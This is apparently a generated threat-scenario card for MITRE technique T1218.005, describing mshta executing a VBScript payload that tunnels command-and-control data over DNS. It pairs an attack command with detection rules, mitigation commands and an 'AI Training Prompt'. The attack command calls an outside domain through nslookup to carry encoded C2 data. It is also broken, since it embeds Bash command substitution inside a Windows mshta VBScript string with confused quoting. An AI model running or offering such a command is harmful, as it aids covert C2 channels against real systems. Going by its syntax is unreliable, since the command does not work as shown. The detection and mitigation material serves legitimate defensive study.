---
type: campaign
scenario_id: 429
tactic: Defense Evasion
technique: "T1218.005: Mshta"
technique_id: T1218.005
tags: [campaign, lotl, defense_evasion]
---

# Using mshta to execute DNS tunneling VBScript payload.

## Threat Description
Using mshta to execute DNS tunneling VBScript payload.

## Attack Command
```
mshta vbscript:Execute("CreateObject('WScript.Shell').Run('nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)');Close")
```

## Detection Logic
Monitor mshta VBScript: `wmic process where name='mshta.exe' get commandline | findstr nslookup`; YARA rule: `rule MshtaVbsDnsTunnel { strings: $a = /mshta.*vbscript.*nslookup/ nocase; condition: $a }`.

## Mitigation
Restrict mshta: `icacls %windir%\System32\mshta.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block mshta DNS' dir=out program='%windir%\System32\mshta.exe' action=block`.

## AI Training Prompt
Train AI to detect mshta-based DNS tunneling via VBScript by analyzing nslookup TXT queries, mshta command-line arguments, and DNS traffic patterns; suggest DNS restrictions.

## References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
